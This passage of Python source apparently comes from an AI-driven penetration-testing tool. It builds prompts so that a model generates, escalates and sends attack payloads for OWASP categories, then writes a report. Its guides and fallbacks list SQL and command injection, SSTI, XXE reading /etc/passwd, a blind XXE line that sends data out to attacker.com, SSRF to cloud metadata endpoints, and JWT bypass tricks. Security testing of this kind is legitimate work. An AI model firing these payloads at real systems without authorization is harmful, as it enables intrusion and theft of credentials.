- Empty passwords, default credentials

**SESSION MANAGEMENT:**
- Test session fixation: set custom session ID
- Session hijacking: capture and reuse sessions
- Check session timeout
- Predictable session IDs

**CREDENTIAL STUFFING:**
- Test for rate limiting on login
- Check for account lockout
- CAPTCHA bypass

**AUTHENTICATION BYPASS:**
- SQL injection in login: ' OR '1'='1
- Remove authentication headers (use request_modifications.headers_to_remove: ["Authorization"])
- Remove JWT tokens from Authorization header
- Manipulate cookies (use request_modifications to add/remove cookies)
- Access protected endpoints without auth headers

**JWT VULNERABILITIES:**
- None algorithm attack
- Weak secret brute-force
- Algorithm confusion RS256 → HS256
- Remove JWT entirely and test endpoint access

**CRITICAL FOR AUTH TESTING:**
Use request_modifications to remove Authorization headers:
{
  "request_modifications": {
    "headers_to_remove": ["Authorization", "X-API-Key", "Bearer"]
  }
}
""",
        
        "Cryptographic Failures": """
**WEAK ENCRYPTION:**
- Check for ECB mode patterns
- Test for no encryption (plaintext)
- Detect weak ciphers (DES, RC4)

**INSECURE TRANSMISSION:**
- Check for HTTP instead of HTTPS
- Missing Strict-Transport-Security header
- Mixed content

**WEAK HASHING:**
- Detect MD5, SHA1 usage
- No salting in password hashes
- Hardcoded encryption keys in responses

**SENSITIVE DATA EXPOSURE:**
- API keys in responses
- Database credentials in errors
- PII in logs or responses
""",
        
        "Security Misconfiguration": """
**VERBOSE ERROR MESSAGES:**
- Trigger errors to see stack traces
- SQL errors revealing database structure
- Framework errors showing versions

**DEFAULT CONFIGURATIONS:**
- Default admin panels: /admin, /phpmyadmin
- Default credentials
- Sample files: /test.php, /phpinfo.php

**MISSING SECURITY HEADERS:**
- No X-Frame-Options (Clickjacking)
- No Content-Security-Policy
- No X-Content-Type-Options
- Server version disclosure

**DIRECTORY LISTING:**
- Access /, /images/, /uploads/
- Look for .git, .env, backup files

**DEBUG MODE ENABLED:**
- Check for debug=true parameters
- Look for verbose logging in responses
""",
        
        "Vulnerable Components": """
**VERSION DETECTION:**
- Check Server headers
- Detect framework versions from errors
- Library versions in HTML comments
- /robots.txt, /sitemap.xml

**KNOWN CVE EXPLOITATION:**
- Test for known vulnerabilities in detected versions
- Framework-specific exploits
- Outdated dependencies

**DEPENDENCY CONFUSION:**
- Check for external library loading
- Test for package substitution
""",
        
        "SSRF": """
**INTERNAL ACCESS:**
- http://localhost, http://127.0.0.1
- http://169.254.169.254/latest/meta-data/ (AWS metadata)
- http://metadata.google.internal/ (GCP)

**PORT SCANNING:**
- http://internal-host:22
- http://internal-host:3306
- http://internal-host:6379

**PROTOCOL SMUGGLING:**
- file:///etc/passwd
- gopher://internal-host:6379/_...
- dict://internal-host:11211/

**DNS REBINDING:**
- Use services like rebind.network
- Time-based DNS switching

**FILTER BYPASS:**
- Use IP encoding: 0x7f000001 (127.0.0.1)
- Use URL encoding: http://127.0.0.1@evil.com
- Use DNS: http://localtest.me (resolves to 127.0.0.1)
""",
        
        "Insecure Deserialization": """
**JAVA DESERIALIZATION:**
- ysoserial gadget chains
- Magic bytes: AC ED 00 05 (Java serialized object)
- CommonsCollections, Spring, Groovy gadgets

**PYTHON PICKLE:**
- Pickle payloads with __reduce__
- RCE through object injection

**PHP OBJECT INJECTION:**
- O:8:"stdClass":... patterns
- Magic methods: __wakeup, __destruct

**.NET DESERIALIZATION:**
- BinaryFormatter vulnerabilities
- TypeNameHandling issues in JSON.NET
""",
        
        "XXE": """
**EXTERNAL ENTITY:**
- <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;
- Blind XXE with OOB: <!ENTITY xxe SYSTEM "http://attacker.com/?data=...">

**BILLION LAUGHS:**
- Recursive entity expansion DoS

**SSRF VIA XXE:**
- <!ENTITY xxe SYSTEM "http://internal-server/">

**PARAMETER ENTITIES:**
- Use parameter entities for blind extraction
""",
        
        "Security Logging Failures": """
**LOG INJECTION:**
- Inject CRLF to forge log entries
- Test for log file path traversal

**MISSING LOGGING:**
- Perform suspicious actions and check if logged
- Test failed login attempts
- Test privilege escalation attempts

**INSUFFICIENT MONITORING:**
- Check for WAF/IDS presence
- Test for rate limiting
- Verify alerting mechanisms
"""
    }
    
    return guides.get(category, "Perform security testing appropriate for this vulnerability category.")


def _get_adaptive_guidance(category: str, intelligence: dict) -> str:
    """Returns adaptive guidance based on accumulated intelligence."""
    
    guidance = f"""
**ADAPTIVE STRATEGY FOR {category}:**

Based on what we've learned:
"""
    
    if intelligence['technologies_detected']:
        guidance += f"\n🎯 DETECTED TECHNOLOGIES: {', '.join(intelligence['technologies_detected'][:3])}"
        guidance += "\n   → Craft payloads specific to these technologies!"
    
    if intelligence['working_attack_vectors']:
        guidance += f"\n✓ WORKING VECTORS: {', '.join(intelligence['working_attack_vectors'][:3])}"
        guidance += "\n   → Double down on these! Escalate and exploit further!"
    
    if intelligence['security_indicators']:
        guidance += f"\n⚠ SECURITY ISSUES FOUND: {len(intelligence['security_indicators'])} indicators"
        guidance += "\n   → Use these clues to refine your attack!"
    
    if intelligence['error_patterns']:
        guidance += f"\n🔍 ERROR PATTERNS: {len(intelligence['error_patterns'])} unique patterns"
        guidance += "\n   → Parse errors for framework versions, paths, SQL engines!"
    
    guidance += """

**YOUR NEXT PAYLOADS MUST:**
1. Build on successful vectors from previous iterations
2. Exploit specific technologies detected
3. Escalate confirmed vulnerabilities
4. Try alternative syntaxes if previous attempts failed
5. Be HIGHLY targeted based on response analysis
"""
    
    return guidance


def _get_analysis_framework(category: str) -> str:
    """Returns category-specific analysis framework."""
    
    frameworks = {
        "Injection": """
**INJECTION ANALYSIS:**
1. ERROR MESSAGES: SQL syntax errors, command not found, template errors
2. LOGIC CHANGES: Different response for true/false conditions
3. TIME DELAYS: Response time >3s for time-based payloads
4. EXPRESSION EVALUATION: {{7*7}} returns 49
5. FRAMEWORK DETECTION: Spring EL errors, Thymeleaf exceptions
6. DATABASE DETECTION: MySQL, PostgreSQL, MSSQL specific errors
""",
        
        "Broken Access Control": """
**ACCESS CONTROL ANALYSIS:**
1. UNAUTHORIZED DATA: Accessing other users' data
2. STATUS CODES: 200 OK when should be 403 Forbidden
3. RESPONSE CONTENT: Different user's information in response
4. PRIVILEGE ESCALATION: Admin functions accessible
5. IDOR SUCCESS: Sequential ID access reveals multiple users
6. PATH TRAVERSAL: File contents from system paths
""",
        
        "Authentication Failures": """
**AUTHENTICATION ANALYSIS:**
1. BYPASS SUCCESS: Authenticated without valid credentials
2. SESSION ISSUES: Session fixation, predictable sessions
3. WEAK CREDENTIALS: Default/common passwords work
4. NO RATE LIMITING: Unlimited login attempts allowed
5. JWT ISSUES: Token manipulation successful
6. PASSWORD RESET: Insecure password reset flow
""",
        
        "Cryptographic Failures": """
**CRYPTOGRAPHIC ANALYSIS:**
1. PLAINTEXT DATA: Sensitive data not encrypted
2. WEAK CIPHERS: DES, RC4, ECB mode detected
3. INSECURE TRANSMISSION: HTTP for sensitive operations
4. WEAK HASHING: MD5, SHA1 usage
5. KEY EXPOSURE: Hardcoded keys in responses
6. MISSING HEADERS: No HSTS, weak TLS configuration
""",
        
        "Security Misconfiguration": """
**MISCONFIGURATION ANALYSIS:**
1. VERBOSE ERRORS: Stack traces, debug info
2. VERSION DISCLOSURE: Server, framework versions exposed
3. DEFAULT CONFIGS: Default admin panels accessible
4. DIRECTORY LISTING: File/folder structure exposed
5. MISSING HEADERS: Security headers absent
6. DEBUG MODE: Application in debug/development mode
""",
        
        "Vulnerable Components": """
**COMPONENT ANALYSIS:**
1. VERSION DETECTION: Framework/library versions identified
2. KNOWN CVES: Matching known vulnerabilities
3. EOL COMPONENTS: End-of-life software detected
4. OUTDATED LIBRARIES: Old versions with security issues
5. EXPLOIT SUCCESS: Known exploit works
""",
        
        "SSRF": """
**SSRF ANALYSIS:**
1. INTERNAL ACCESS: Internal IP responses received
2. METADATA ACCESS: Cloud metadata accessible
3. PORT SCANNING: Different responses for open/closed ports
4. PROTOCOL ABUSE: file://, gopher://, dict:// work
5. DNS QUERIES: External DNS queries triggered
6. FILTER BYPASS: IP encoding bypasses restrictions
""",
        
        "Insecure Deserialization": """
**DESERIALIZATION ANALYSIS:**
1. OBJECT INJECTION: Serialized objects processed
2. GADGET CHAINS: Known gadget exploitation successful
3. RCE ACHIEVED: Remote code execution through deserialization
4. TYPE CONFUSION: Object type manipulation works
5. MAGIC BYTES: Serialization format detected
""",
        
        "XXE": """
**XXE ANALYSIS:**
1. FILE DISCLOSURE: System files retrieved
2. ENTITY EXPANSION: External entities processed
3. SSRF VIA XXE: Internal requests made through XML
4. OOB DATA: Out-of-band data exfiltration successful
5. PARSER ERRORS: XML parser vulnerabilities exposed
6. DTD PROCESSING: External DTD loading enabled
""",
        
        "Security Logging Failures": """
**LOGGING ANALYSIS:**
1. MISSING LOGS: No audit trail for sensitive operations
2. LOG INJECTION: CRLF injection into logs successful
3. NO MONITORING: No WAF/IDS/IPS detection
4. NO RATE LIMITING: Unlimited requests allowed
5. NO ALERTING: Suspicious activities undetected
6. LOG TAMPERING: Logs can be modified/deleted
"""
    }
    
    return frameworks.get(category, """
**GENERAL VULNERABILITY ANALYSIS:**
1. Response differences from baseline
2. Error messages and information disclosure
3. Behavioral changes indicating security issues
4. Technology/framework detection
5. Security control bypasses
6. Successful exploitation indicators
""")

def _adaptive_poc_generation(
    parsed_request: ParsedHttpRequest,
    proxy: str | None,
    param_to_test: str,
    category: str,
    confirmation_results: list[dict]
) -> list[dict]:
    """
    UNIVERSAL: Generate adaptive PoC for ANY OWASP category based on confirmed findings.
    """
    console = Console()
    
    # Analyze what worked
    technologies_detected = []
    successful_patterns = []
    working_vectors = []
    
    for result in confirmation_results:
        analysis = result.get('analysis', '')
        
        # Extract detected technologies
        tech_match = re.search(r'TECHNOLOGY_DETECTED:(.*?)(?=VULNERABILITY_INDICATORS|$)', analysis, re.DOTALL | re.IGNORECASE)
        if tech_match:
            tech_lines = tech_match.group(1).strip().split('\n')
            technologies_detected.extend([line.strip() for line in tech_lines if line.strip()])
        
        # Extract working vectors
        vector_match = re.search(r'ATTACK_VECTOR_WORKING:\s*([^\n]+)', analysis, re.IGNORECASE)
        if vector_match:
            working_vectors.append(vector_match.group(1).strip())
        
        successful_patterns.append({
            "payload": result.get('payload', 'N/A')[:100],
            "test_type": result.get('test_type', 'unknown'),
            "verdict": result.get('verdict', 'unknown'),
            "confidence": result.get('confidence', 0),
            "why_it_worked": analysis[:400]
        })
    
    # Category-specific PoC guidance
    poc_guidance = _get_poc_guidance(category)
    
    # Generate targeted PoC
    poc_prompt = f"""A {category} vulnerability is CONFIRMED. Generate 6-10 SAFE PoC payloads/tests.

=== CONFIRMED FINDINGS ===
{safe_json_dumps(successful_patterns)}

=== TECHNOLOGIES DETECTED ===
{', '.join(set(technologies_detected)) if technologies_detected else 'Unknown'}

=== WORKING ATTACK VECTORS ===
{', '.join(set(working_vectors)) if working_vectors else 'Various'}

=== CATEGORY-SPECIFIC POC REQUIREMENTS ===
{poc_guidance}

**CRITICAL RULES:**
1. Use the SAME attack vector that worked during confirmation
2. Extract SAFE, harmless information only
3. Demonstrate impact without causing damage
4. Adapt to specific technology/framework detected
5. Provide clear evidence of vulnerability
6. Be specific to {category} vulnerability type

Return JSON array:
[
  {{
    "payload": "...",
    "purpose": "what it demonstrates/extracts",
    "safe": true,
    "expected_result": "what indicates success",
    "request_modifications": {{
      "headers_to_remove": ["Authorization"],  // If auth bypass is being tested
      "headers_to_add": {{"X-Custom": "value"}},  // Optional
      "cookies_to_remove": ["session"],  // Optional
      "cookies_to_add": {{"test": "value"}}  // Optional
    }}
  }}
]

**For Auth/Access Control PoCs, include request_modifications to remove auth headers/cookies!**"""

    ai_response = _call_ai(poc_prompt)
    cleaned_response = _extract_json_from_ai_response(ai_response)
    
    poc_payloads = safe_json_parse(cleaned_response, default=[])
    
    if not isinstance(poc_payloads, list):
        if isinstance(poc_payloads, dict):
            poc_payloads = [poc_payloads]
        else:
            poc_payloads = []
    
    if not poc_payloads:
        log.warning(f"No PoC payloads extracted for {category}. Using fallback.")
        poc_payloads = _get_fallback_poc(category)
    
    successful_poc = []
    
    for idx, poc_obj in enumerate(poc_payloads, 1):
        try:
            payload = poc_obj.get('payload', poc_obj) if isinstance(poc_obj, dict) else str(poc_obj)
            purpose = poc_obj.get('purpose', 'unknown') if isinstance(poc_obj, dict) else 'unknown'
            expected_result = poc_obj.get('expected_result', 'varies') if isinstance(poc_obj, dict) else 'varies'
            
            # Extract request modifications if present
            request_modifications = None
            if isinstance(poc_obj, dict) and 'request_modifications' in poc_obj:
                request_modifications = poc_obj.get('request_modifications')
                log.info(f"  [{idx}/{len(poc_payloads)}] PoC with modifications: {payload[:60]}...")
                log.info(f"      Purpose: {purpose}")
                log.info(f"      Modifications: {safe_json_dumps(request_modifications)}")
            else:
                log.info(f"  [{idx}/{len(poc_payloads)}] PoC: {payload[:60]}...")
                log.info(f"      Purpose: {purpose}")
            
            response = _send_request(parsed_request, proxy, param_to_test, payload, request_modifications)
            if not response:
                continue
            
            # Analyze PoC success with category-specific criteria
            poc_analysis_prompt = f"""Analyze if this PoC successfully demonstrates {category} vulnerability.

CATEGORY: {category}
PAYLOAD/TEST: {payload}
PURPOSE: {purpose}
EXPECTED RESULT: {expected_result}

RESPONSE:
- Status: {response['status_code']}
- Time: {response.get('time', 0)}s
- Headers: {json.dumps(dict(list(response.get('headers', {}).items())[:5]), indent=2)}
- Body: {response['body'][:1500]}

=== CATEGORY-SPECIFIC SUCCESS CRITERIA ===
{_get_poc_success_criteria(category)}

ANALYSIS:
- Was the vulnerability successfully demonstrated? (YES/NO/PARTIAL)
- What evidence confirms this?
- What data/behavior was revealed?
- Severity and business impact?
- Is this reproducible proof?

PROVIDE:
SUCCESS: [YES/NO/PARTIAL]
EVIDENCE: [Specific proof from response]
EXTRACTED_DATA: [What was obtained/demonstrated]
SEVERITY: [Critical/High/Medium/Low]
IMPACT: [Business impact description]"""

            analysis = _call_ai(poc_analysis_prompt)
            
            # Check if PoC was successful
            success_match = re.search(r'SUCCESS:\s*(YES|NO|PARTIAL)', analysis, re.IGNORECASE)
            success = success_match.group(1).upper() if success_match else "NO"
            
            if success in ["YES", "PARTIAL"]:
                log.info(f"  [bold green]✓ PoC successful! ({success})[/bold green]")
                
                # Extract evidence
                evidence_match = re.search(r'EVIDENCE:\s*([^\n]+)', analysis, re.IGNORECASE)
                evidence = evidence_match.group(1).strip() if evidence_match else "See analysis"
                
                # Extract severity
                severity_match = re.search(r'SEVERITY:\s*(\w+)', analysis, re.IGNORECASE)
                severity = severity_match.group(1).strip() if severity_match else "High"
                
                successful_poc.append({
                    "payload": str(payload),
                    "purpose": str(purpose),
                    "expected_result": str(expected_result),
                    "success": success,
                    "evidence": evidence,
                    "severity": severity,
                    "response": clean_response_data(response),
                    "analysis": str(analysis)
                })
            else:
                log.debug(f"  [dim]✗ PoC did not succeed[/dim]")
        
        except Exception as e:
            log.error(f"Error processing PoC {idx}: {e}")
            continue
    
    return successful_poc


def _get_poc_guidance(category: str) -> str:
    """Returns category-specific PoC generation guidance."""
    
    guidance = {
        "Injection": """
**SQL INJECTION PoC:**
- Extract database version: @@version, version()
- Get current user: user(), current_user
- List databases: UNION SELECT schema_name FROM information_schema.schemata
- Safe file read: LOAD_FILE('/etc/hostname')

**COMMAND INJECTION PoC:**
- hostname, whoami, id
- uname -a (system info)
- pwd (current directory)
- echo $USER

**SSTI PoC:**
- {{config}} (Flask)
- {{7*7}} (expression evaluation)
- T(java.lang.System).getProperty('os.name') (Spring)
- ${7*7} (various template engines)

**SPEL PoC:**
- T(java.lang.System).getProperty('user.name')
- T(java.lang.System).getProperty('java.version')

**NoSQL PoC:**
- Extract database info
- List collections
- Query without authentication

**XXE PoC:**
- Read /etc/hostname
- Read safe system files
- SSRF to metadata endpoints
""",
        
        "Broken Access Control": """
**IDOR PoC:**
- Access multiple user accounts by changing IDs
- Show data from user A while logged in as user B
- Access resources 1-10 with sequential IDs

**PATH TRAVERSAL PoC:**
- Read /etc/hostname, /etc/os-release
- Read safe application files
- Show directory structure

**PRIVILEGE ESCALATION PoC:**
- Access admin endpoint as regular user
- Modify other users' data
- Execute admin functions without authorization

**HORIZONTAL ESCALATION:**
- User 1 accessing User 2's data
- Demonstrate cross-account data access

**VERTICAL ESCALATION:**
- Regular user accessing admin functions
- User role manipulation
""",
        
        "Authentication Failures": """
**AUTHENTICATION BYPASS PoC:**
- Login without valid credentials
- SQL injection in authentication
- Session fixation demonstration

**SESSION MANAGEMENT PoC:**
- Predictable session ID pattern
- Session doesn't expire
- Session hijacking demonstration

**WEAK CREDENTIALS PoC:**
- Default credentials work
- Common passwords accepted
- No password complexity enforcement

**JWT PoC:**
- None algorithm attack
- Token manipulation
- Algorithm confusion
""",
        
        "Cryptographic Failures": """
**WEAK ENCRYPTION PoC:**
- Identify ECB mode patterns
- Demonstrate plaintext data transmission
- Show weak cipher usage

**SENSITIVE DATA EXPOSURE PoC:**
- Extract API keys from responses
- Show unencrypted sensitive data
- Demonstrate missing encryption

**WEAK HASHING PoC:**
- Identify MD5/SHA1 usage
- Show unsalted password hashes
- Demonstrate reversible encryption
""",
        
        "Security Misconfiguration": """
**VERBOSE ERRORS PoC:**
- Trigger stack traces
- Show debug information
- Reveal framework versions

**DEFAULT CONFIG PoC:**
- Access default admin panels
- Use default credentials
- Show sample/test files

**MISSING HEADERS PoC:**
- Demonstrate missing security headers
- Show server version disclosure
- Identify security header absence

**DIRECTORY LISTING PoC:**
- Show directory contents
- Access .git, .env files
- List backup files
""",
        
        "Vulnerable Components": """
**VERSION DETECTION PoC:**
- Identify exact framework/library versions
- Show version disclosure in headers/errors
- Detect outdated components

**KNOWN CVE PoC:**
- Demonstrate known vulnerability exploitation
- Show vulnerable component behavior
- Exploit outdated dependency
""",
        
        "SSRF": """
**INTERNAL ACCESS PoC:**
- Access http://localhost
- Query http://127.0.0.1:8080
- Reach internal services

**METADATA ACCESS PoC:**
- AWS: http://169.254.169.254/latest/meta-data/
- GCP: http://metadata.google.internal/
- Azure: http://169.254.169.254/metadata/

**PORT SCANNING PoC:**
- Scan common ports (22, 80, 3306, 6379)
- Show port status differences
- Identify internal services

**PROTOCOL PoC:**
- file:///etc/hostname
- Show alternative protocol handling
""",
        
        "Insecure Deserialization": """
**DESERIALIZATION PoC:**
- Trigger deserialization with safe payload
- Demonstrate object injection
- Show gadget chain exploitation (safe command)

**RCE PoC:**
- Execute safe command (hostname, whoami)
- Demonstrate code execution through deserialization
""",
        
        "XXE": """
**XXE PoC:**
- Read /etc/hostname
- Extract safe system file
- Demonstrate external entity processing

**BLIND XXE PoC:**
- OOB data exfiltration to controlled server
- Show DTD processing

**XXE SSRF PoC:**
- Internal network access via XXE
- Port scanning through XXE
""",
        
        "Security Logging Failures": """
**LOGGING PoC:**
- Perform actions that should be logged but aren't
- Demonstrate log injection (CRLF)
- Show missing audit trail

**MONITORING PoC:**
- Multiple failed login attempts without lockout
- No rate limiting on sensitive endpoints
- Suspicious activity goes undetected
"""
    }
    
    return guidance.get(category, "Generate safe PoC that demonstrates the vulnerability without causing damage.")


def _get_poc_success_criteria(category: str) -> str:
    """Returns success criteria for PoC validation."""
    
    criteria = {
        "Injection": """
SUCCESS if:
- Database version/info extracted
- System commands executed (hostname, whoami)
- Template expressions evaluated (7*7 = 49)
- Error messages reveal injection
- Time delays observed
- Boolean logic manipulated
""",
        
        "Broken Access Control": """
SUCCESS if:
- Unauthorized data accessed
- Other user's information retrieved
- Admin functions accessible
- Path traversal reveals files
- IDOR exposes multiple records
- Authorization bypass confirmed
""",
        
        "Authentication Failures": """
SUCCESS if:
- Authentication bypassed
- Session manipulated successfully
- Default credentials work
- No rate limiting observed
- Weak password accepted
- JWT vulnerabilities exploited
""",
        
        "Cryptographic Failures": """
SUCCESS if:
- Plaintext sensitive data found
- Weak ciphers detected
- Keys exposed in responses
- Insecure transmission confirmed
- Weak hashing identified
- Missing security headers
""",
        
        "Security Misconfiguration": """
SUCCESS if:
- Stack traces visible
- Version information disclosed
- Default configs accessible
- Directory listing shown
- Debug mode enabled
- Security headers missing
""",
        
        "Vulnerable Components": """
SUCCESS if:
- Specific versions identified
- Known CVE exploited
- Outdated components detected
- Vulnerable dependencies confirmed
""",
        
        "SSRF": """
SUCCESS if:
- Internal resources accessed
- Metadata endpoints reached
- Port scanning successful
- Alternative protocols work
- Cloud credentials exposed
""",
        
        "Insecure Deserialization": """
SUCCESS if:
- Object injection confirmed
- Gadget chain executed
- RCE achieved (safe command)
- Type manipulation successful
""",
        
        "XXE": """
SUCCESS if:
- System files read
- External entities processed
- SSRF via XXE works
- OOB data exfiltration successful
""",
        
        "Security Logging Failures": """
SUCCESS if:
- Actions not logged
- Log injection successful
- No monitoring detected
- No rate limiting
- Audit trail missing
"""
    }
    
    return criteria.get(category, "SUCCESS if vulnerability is clearly demonstrated with concrete evidence.")


def _get_fallback_poc(category: str) -> list[dict]:
    """Returns fallback PoC payloads when AI fails to generate them."""
    
    fallbacks = {
        "Injection": [
            {"payload": "' OR '1'='1", "purpose": "SQL Boolean-based injection"},
            {"payload": "; whoami", "purpose": "Command injection"},
            {"payload": "{{7*7}}", "purpose": "SSTI detection"}
        ],
        "Broken Access Control": [
            {"payload": "../../../etc/hostname", "purpose": "Path traversal"},
            {"payload": "?user_id=1", "purpose": "IDOR test"}
        ],
        "SSRF": [
            {"payload": "http://127.0.0.1", "purpose": "Internal access"},
            {"payload": "http://169.254.169.254/latest/meta-data/", "purpose": "AWS metadata"}
        ],
        "Authentication Failures": [
            {"payload": "admin:admin", "purpose": "Default credentials"}
        ]
    }
    
    return fallbacks.get(category, [{"payload": "N/A", "purpose": "Manual verification required"}])

# ==================== MAIN WORKFLOW (FIXED) ====================

def perform_full_workflow(raw_request_string: str, owasp_categories: list[str], selected_params: list[str] | None, proxy: str | None):
    """
    Performs adaptive 3-stage vulnerability analysis with iterative learning.
    """
    console = Console()
    final_findings = []

    try:
        parsed_request = parse_raw_http_request(raw_request_string)
    except ValueError as e:
        log.error(f"Failed to parse raw HTTP request: {e}", extra={"markup": True})
        return []

    with console.status("[cyan]Capturing baseline response...[/]") as status:
        baseline_response_data = _send_request(parsed_request, proxy)
        if not baseline_response_data:
            log.error("Failed to capture a baseline response. Aborting.")
            return []
        log.info("[green]Baseline captured successfully.[/green]")

    for category in owasp_categories:
        console.rule(f"[bold cyan]Starting Adaptive Analysis for: {category}[/bold cyan]")
        
        status.update(f"[cyan]Stage 1/3: Detecting potential '{category}' issues...[/]")
        
        detect_prompt = f"""You are a senior VAPT specialist. Evaluate if the "{category}" vulnerability is worth testing.

REQUEST:
Method: {parsed_request.method}
URL: {parsed_request.url}
Headers: {json.dumps(dict(list(parsed_request.headers.items())[:5]), indent=2)}
Body: {parsed_request.data[:500] if parsed_request.data else '[No Body]'}

BASELINE RESPONSE:
Status: {baseline_response_data['status_code']}
Headers: {json.dumps(dict(list(baseline_response_data['headers'].items())[:5]), indent=2)}
Body (first 800 chars): {baseline_response_data['body'][:800]}

Analysis points:
1. Input handling mechanisms
2. Error message verbosity
3. Technology stack indicators in headers/body
4. Response patterns suggesting dynamic processing
5. Parameter types and locations

VERDICT: "TESTING_RECOMMENDED" or "NOT_RELEVANT"
REASONING: (brief explanation)
RECOMMENDED_VECTORS: (which injection types to prioritize)"""

        detection_reasoning = _call_ai(detect_prompt)
        if "not relevant" in detection_reasoning.lower() or "not_relevant" in detection_reasoning.lower():
            log.info(f"Detection AI concluded '{category}' is not relevant. Skipping.")
            continue
        log.info(f"[yellow]Detection found potential '{category}' vulnerability.[/yellow]")

        # ===== STAGE 2: ADAPTIVE ITERATIVE CONFIRMATION =====
        status.update(f"[cyan]Stage 2/3: Adaptive confirmation testing for '{category}'...[/]")
        param_to_test = selected_params[0] if selected_params else "primary parameter"
        
        successful_confirmations = _adaptive_payload_iteration(
            parsed_request=parsed_request,
            proxy=proxy,
            param_to_test=param_to_test,
            baseline_response=baseline_response_data,
            category=category,
            max_iterations=5
        )
        
        if not successful_confirmations:
            log.info(f"[yellow]No confirmation achieved for '{category}' after adaptive testing. Skipping.[/yellow]")
            continue
        
        log.info(f"[bold green]✓ Vulnerability CONFIRMED for '{category}' with {len(successful_confirmations)} successful payloads![/bold green]")

        # ===== STAGE 3: ADAPTIVE POC =====
        status.update(f"[cyan]Stage 3/3: Generating adaptive PoC for '{category}'...[/]")
        
        successful_poc = _adaptive_poc_generation(
            parsed_request=parsed_request,
            proxy=proxy,
            param_to_test=param_to_test,
            category=category,
            confirmation_results=successful_confirmations
        )
        
        if not successful_poc:
            log.warning(f"PoC generation failed for '{category}', but vulnerability is confirmed")
            successful_poc = [{"payload": "N/A", "analysis": "Vulnerability confirmed but PoC extraction failed"}]
        
        log.info(f"[bold green]PoC for '{category}' completed: {len(successful_poc)} successful extractions.[/bold green]")

        # Build detailed finding
        final_findings.append({
            "category": category,
            "severity": "Critical" if "injection" in category.lower() else "High",
            "detection_reasoning": detection_reasoning,
            "confirmation_payloads": successful_confirmations,
            "confirmation_summary": f"{len(successful_confirmations)} payloads confirmed vulnerability through adaptive testing",
            "poc_payloads": successful_poc,
            "poc_summary": f"{len([p for p in successful_poc if p['payload'] != 'N/A'])} PoC payloads successful",
            "adaptive_iterations": "Multiple iterations with learning applied"
        })

    # ===== FINAL REPORT GENERATION =====
    if final_findings:
        console.rule("[bold green]Generating Final VAPT Report[/bold green]")
        
        # Prepare findings summary for AI
        findings_summary = []
        for finding in final_findings:
            finding_data = {
                "category": finding["category"],
                "severity": finding["severity"],
                "detection_reasoning": finding["detection_reasoning"][:500],
                "confirmation_count": len(finding["confirmation_payloads"]),
                "successful_payloads": [
                    {
                        "payload": p.get("payload", "N/A")[:100],
                        "type": p.get("type", "unknown"),
                        "analysis": p.get("analysis", "")[:300]
                    }
                    for p in finding["confirmation_payloads"][:3]  # Top 3 payloads
                ],
                "poc_count": len(finding["poc_payloads"]),
                "poc_results": [
                    {
                        "payload": p.get("payload", "N/A")[:100],
                        "extracts": p.get("expected_extract", "N/A"),
                        "analysis": p.get("analysis", "")[:300]
                    }
                    for p in finding["poc_payloads"][:3]  # Top 3 PoCs
                ]
            }
            findings_summary.append(finding_data)
        
        report_prompt = f"""You are a senior VAPT security consultant preparing a professional penetration testing report.

TARGET APPLICATION:
- Method: {parsed_request.method}
- URL: {parsed_request.url}
- Testing Scope: {', '.join(owasp_categories)}

VULNERABILITIES DISCOVERED:
{safe_json_dumps(findings_summary)}

Generate a comprehensive PLAIN TEXT penetration testing report with the following structure:

=================================================================================
                        VULNERABILITY ASSESSMENT REPORT
=================================================================================

EXECUTIVE SUMMARY:
[Provide a high-level overview of findings, risk level, and business impact]

TARGET DETAILS:
- Endpoint: [URL and method]
- Parameters Tested: [List]
- Testing Date: [Current date]

=================================================================================
                              FINDINGS
=================================================================================

For each vulnerability, provide:

VULNERABILITY #X: [Category Name]
------------------------
Severity: [Critical/High/Medium/Low]
CVSS Score: [Estimate]

Description:
[Explain the vulnerability in business terms and technical terms]

Attack Scenario:
[Describe how an attacker could exploit this]

Evidence:
[Summarize the confirmation testing results]
- Number of successful payloads: X
- Key indicators observed: [List specific error messages, behaviors]

Proof of Concept:
[Show 1-2 most impactful PoC payloads with their results]
Example:
  Payload: [payload]
  Result: [what was extracted/achieved]

Impact:
[Business and technical impact]

=================================================================================
                           RECOMMENDATIONS
=================================================================================

For each vulnerability, provide:
1. Immediate mitigation steps
2. Long-term fixes
3. Best practices

=================================================================================
                              CONCLUSION
=================================================================================

[Summary of overall security posture and priority recommendations]

=================================================================================

Make the report professional, clear, and actionable. Use proper formatting with headers, bullet points, and sections."""

        with console.status("[cyan]Generating final report...[/]") as status:
            final_report = _call_ai(report_prompt)
        
        # Display the report
        console.print("\n")
        console.print(Panel(
            final_report,
            title="[bold green]VAPT Assessment Report[/bold green]",
            border_style="green",
            padding=(1, 2)
        ))
        
        # Optionally save to file
        try:
            with open("vapt_report.txt", "w", encoding="utf-8") as f:
                f.write(final_report)
            log.info("[green]Report saved to: vapt_report.txt[/green]")
        except Exception as e:
            log.warning(f"Could not save report to file: {e}")

    return final_findings